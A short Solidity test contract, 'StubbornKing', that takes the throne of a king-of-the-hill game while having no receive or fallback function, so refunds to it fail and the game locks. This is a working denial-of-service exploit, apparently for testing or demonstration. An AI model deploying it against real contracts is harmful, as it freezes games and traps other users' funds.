// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

interface IKing {
    function claimThrone() external payable;
}

/// @title StubbornKing — test/demo only
/// @notice Takes the throne from a contract and has NO receive()/fallback, so every ETH refund
///         sent to it fails.
contract StubbornKing {
    function seize(address game) external payable {
        IKing(game).claimThrone{value: msg.value}();
    }
}
